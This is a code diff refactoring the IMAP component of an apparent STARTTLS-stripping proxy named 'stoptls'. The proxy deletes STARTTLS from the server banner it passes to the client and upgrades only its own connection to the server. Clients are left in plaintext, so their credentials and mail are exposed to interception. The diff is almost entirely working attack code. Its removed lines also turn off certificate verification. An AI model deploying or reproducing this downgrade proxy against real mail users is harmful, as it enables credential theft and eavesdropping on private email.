@@ -1,126 +1,94 @@
-import asyncio
+import re
 import logging
-import socket
-import ssl
 
-from stoptls.tcp.base import TCPProxy
-from stoptls.tcp import regex
+from stoptls.tcp.base import TCPProxyConn
+
+logging.getLogger().setLevel(logging.DEBUG)
 
 
-class IMAPProxy(TCPProxy):
-    def __init__(self):
-        super().__init__()
+class IMAPProxyConn(TCPProxyConn):
+    ports = (143,)
+    command_re = re.compile('^(?P<tag>\S*) (?P<cmd>[A-Za-z]*)\r?\n$')
+    response_re = re.compile('^(?P<tag>\S*) (?:(?P<ok>[Oo][Kk])|(?P<bad>[Bb][Aa][Dd])|(?P<no>[Nn][Oo]) )?(?P<response>.*)\r\n$')
+    starttls_re = re.compile('( ?)STARTTLS( ?)', flags=re.IGNORECASE)
 
-    async def strip(self, client_reader, client_writer):
-        dst_address, dst_port = self.get_orig_dst_socket(client_writer)
-        logging.debug('Original destination: {}'.format(dst_address))
-        server_reader, server_writer = await asyncio.open_connection(dst_address,
-                                                                     dst_port)
-        banner = await server_reader.readline()
+    async def strip(self):
+        cls = type(self)
+        banner = await self.server_reader.readline()
         logging.debug('Received banner: {}'.format(banner))
 
         banner = banner.decode('ascii')
-        banner_re = regex.IMAP_RESPONSE.fullmatch(banner)
+        banner_re = cls.response_re.fullmatch(banner)
 
         if banner_re and \
            banner_re.group('response') and \
-           regex.STARTTLS.search(banner_re.group('response')):
-            banner = regex.IMAP_STARTTLS.sub('', banner_re.group(0))
-            server_writer.write(b'asdf STARTTLS\n')
-            await server_writer.drain()
-
-            tls_started = await server_reader.readline()
-            logging.debug('Received data from server: {}'.format(tls_started))
-            tls_started_re = regex.IMAP_RESPONSE.fullmatch(tls_started.decode('ascii'))
-
-            if tls_started_re and tls_started_re.group('ok'):
-                sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-                sc.check_hostname = False
-                sc.verify_mode = ssl.CERT_NONE
-
-                nameinfo = await asyncio.get_running_loop()\
-                                        .getnameinfo((dst_address,
-                                                      dst_port),
-                                                     socket.NI_NAMEREQD)
-                server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
-                                                                             ssl=sc,
-                                                                             server_hostname=nameinfo[0])
-                logging.debug('Sucessfully upgraded to TLS!')
-            else:
-                logging.debug('Failed to upgraded to TLS')
+           cls.starttls_re.search(banner_re.group('response')):
+            banner = cls.starttls_re.sub('', banner_re.group(0))
+            await self.start_tls()
         else:
             # It's possible that STARTTLS, among other CAPABILITYs - wasn't
             # included in the IMAP banner. In this case, we issue the
             # CAPABILITY command. If STARTTLS is indeed a capability, then we
             # upgrade the connection
-            server_writer.write(b'asdf CAPABILITY\n')
-            await server_writer.drain()
+            self.server_writer.write(b'asdf CAPABILITY\n')
+            await self.server_writer.drain()
 
-            tls_supported = await server_reader.readline('\n')
+            tls_supported = await self.server_reader.readline('\n')
             logging.debug('Received data from server:{}').format(tls_supported)
-            tls_supported_re = regex.IMAP_RESPONSE.fullmatch(tls_supported.decode('ascii'))
+            tls_supported_re = cls.response_re.fullmatch(tls_supported.decode('ascii'))
 
             if tls_supported_re and \
                tls_supported_re.group('response') and \
-               regex.STARTTLS.search(tls_supported_re.group('response')):
-                server_writer.write(b'asdf STARTTLS\n')
-                await server_writer.drain()
+               cls.starttls_re.search(tls_supported_re.group('response')):
+                await self.start_tls()
 
-                tls_started = await server_reader.readline()
-                logging.debug('Received data from server: {}'.format(tls_started))
-                tls_started_re = regex.IMAP_RESPONSE.fullmatch(tls_started.decode('ascii'))
-
-                if tls_started_re and tls_started_re.group('ok'):
-                    sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-                    sc.check_hostname = False
-                    sc.verify_mode = ssl.CERT_NONE
-
-                    nameinfo = await asyncio.get_running_loop()\
-                                            .getnameinfo((dst_address,
-                                                          dst_port),
-                                                         socket.NI_NAMEREQD)
-                    server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
-                                                                                 ssl=sc,
-                                                                                 server_hostname=nameinfo[0])
-                    logging.debug('Sucessfully upgraded to TLS!')
-                else:
-                    logging.debug('Failed to upgraded to TLS')
-
-        client_writer.write(banner.encode('ascii'))
+        self.client_writer.write(banner.encode('ascii'))
         logging.debug('Writing banner to client...')
-        await client_writer.drain()
+        await self.client_writer.drain()
 
-        while not server_reader.at_eof():
-            client_data = await client_reader.readline()
+        while not self.server_reader.at_eof():
+            client_data = await self.client_reader.readline()
             logging.debug('Received client data: {}'.format(client_data))
 
-            if client_reader.at_eof():
+            if self.client_reader.at_eof():
                 logging.debug('Client closed connection')
                 break
 
             try:
-                server_writer.write(client_data)
+                self.server_writer.write(client_data)
                 logging.debug('Writing client data to server...')
-                await server_writer.drain()
+                await self.server_writer.drain()
             except ConnectionResetError:
                 break
 
             while True:
                 logging.debug('Reading from server...')
-                server_data = await server_reader.readline()
+                server_data = await self.server_reader.readline()
 
                 logging.debug('Received server data: {}'.format(server_data))
 
-                client_writer.write(server_data)
+                self.client_writer.write(server_data)
                 logging.debug('Writing server data to client...')
-                await client_writer.drain()
+                await self.client_writer.drain()
 
-                server_data_re = regex.IMAP_RESPONSE.fullmatch(server_data.decode('ascii'))
+                server_data_re = cls.response_re.fullmatch(server_data.decode('ascii'))
 
                 if server_data_re.group('tag') != '*' or \
                    server_data_re.group('bad'):
                     break
 
-        server_writer.close()
-        client_writer.close()
-        logging.debug('Connections closed')
+        await super().strip()
+
+    async def start_tls(self):
+        self.server_writer.write('asdf STARTTLS\n'.encode('ascii'))
+        await self.server_writer.drain()
+
+        tls_started = await self.server_reader.readline()
+        tls_started_re = type(self).response_re.fullmatch(tls_started.decode('ascii'))
+
+        if tls_started_re and tls_started_re.group('ok'):
+            logging.debug('Sucessfully upgraded to TLS!')
+            return await self.upgrade_connection()
+        else:
+            logging.debug('Failed to upgrade to TLS')
+            return False
